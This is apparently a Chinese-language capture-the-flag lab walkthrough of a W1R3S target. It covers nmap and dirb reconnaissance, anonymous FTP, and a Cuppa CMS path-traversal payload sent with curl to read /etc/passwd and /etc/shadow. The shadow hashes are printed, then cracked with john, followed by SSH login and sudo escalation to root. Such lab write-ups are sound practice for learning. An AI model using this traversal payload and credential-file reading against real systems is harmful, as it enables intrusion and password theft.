---
title: Hello World
---
注意登录密码为computer

先进行扫描看看它都开了什么端口![[Pasted image 20240819190350.png]]
继续扫描 nmap -sT -sV -O -p21,22,80,3306 192.168.111.130 -sT表示进行TCP扫描，-p表示要扫描的端口（后跟待扫描的端口21，22，80，3306）-sV表示扫描开放服务的版本，-O表示扫描操作系统版本，扫描结果如下：![[Pasted image 20240819192419.png]]
继续扫描漏洞nmap -script=vuln -p 21,22,80,3306 192.168.111.130
扫描的结果也是毫无头绪算了直接试试能不能匿名登录FTP，在kali终端输入ftp 192.168.111.130 然后用户名填写anonymous(匿名登录)，密码为空
先ls一下看看当前目录有什么![[Pasted image 20240819211026.png]]
先打开目录contentcd content,然后继续查看目录好的都是txt文件那么直接mget *.txt
继续下载其他目录的文件
01.txt就一句话没啥东西，02.txt由几行单列井号和两行字符串组成，第一个看不出来是什么，第二个看起来像base64，03.txt就一logo也没啥用，worktodo.txt是一串反字反过来大概意思是我们有很多工作不要乱晃悠了，employee-names.txt里则是员工列表存一下说不定有用。
现在看一下02.txt的内容具体什么意思，用hash-identifier来看一下到底是什么
![[Pasted image 20240819212702.png]]好的是md5，第二行是base64,第一行找了个网站破解了下![[Pasted image 20240819213155.png]]好吧没啥用第二行也转换一下编码，解码之后有点懵It is easy, but not that easy..，啥玩意如果我没理解错的话他说的是这很简单但不是那种简单?
FTP看来是获取不到什么信息了
看看80端口有没有什么漏洞，使用dirb http://192.168.111.130 爆破目录
![[Pasted image 20240820112332.png]]先尝试打开一下administrator(毕竟是管理员的意思)
打开之后进入安装CMS界面这里暴露了他是cuppa CMS ，使用searchsploit cuppa 看看这个CMS有没有漏洞，
![[Pasted image 20240820112831.png]]好的有使用searchsploit -m 25971.txt 复制txt
cat 25971.txt 打开复制的txt，![[Pasted image 20240820113043.png]]红色圈住的可以打开password，target表示目标网址
payload http://192.168.111.130/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd因为不知道到底在什么目录那么直接多弄几个../ 来获取
但是可能会有编码问题所有用curl编码指令为curl --data-urlencode urlConfig=../../../../../../../../../etc/passwd http://192.168.111.130/administrator/alerts/alertConfigField.php
当然password里的密码都是用x代替的所以要访问etc/shadowcurl --data-urlencode urlConfig=../../../../../../../../../etc/shadow http://192.168.111.130/administrator/alerts/alertConfigField.php
获得了三个hashw1r3s:$6$xe/eyoTx$gttdIYrxrstpJP97hWqttvc5cGzDNyMb0vSuppux4f2CcBv3FwOt2P1GFLjZdNqjwRuP3eUjkgb/io7x9q1iP.:17567:0:99999:7::: www-data:$6$8JMxE7l0$yQ16jM..ZsFxpoGue8/0LBUnTas23zaOqg2Da47vmykGTANfutzM8MuFidtb0..Zk.TUKDoDAVRCoXiZAH.Ud1:17560:0:99999:7::: root:$6$vYcecPCy$JNbK.hr7HU72ifLxmjpIP9kTcx./ak2MM3lBs.Ouiu0mENav72TfQIs8h1jPm2rwRFqd87HDC0pi7gn9t7VgZ0:17554:0:99999:7:::
把以上内容存储在命令行根目录下的hash.txt文件里，然后用john hash.txt破解hash值
等了半天root的密码没有爆破出来那就用w1r3s用户登录吧
试试ssh能不能直接登录ssh w1r3s@192.168.111.130 输入密码computer
输入sudo -l 可以看到w1r3s用户已有ALL权限，那么直接提权,sudo /bin/bash
好的有了root权限，打开root目录查看目录可以看到有一个flag.txt文件打开他得到了flag
![[Pasted image 20240820115942.png]]
总结一下使用的工具和流程

先用nmap扫描开了什么端口
用nmap扫描漏洞(虽然没啥用)
然后连接FTP但是下载的文件都没啥用
然后连接80端口(打开网页)
发现靶机是cuppa CMS然后用searchsploit 查找有没有漏洞
发现有文件包含漏洞包含/etc/shadow，但是有编码问题使用curl --data-urlencode 解决
破解hash值
ssh登录，获得flag
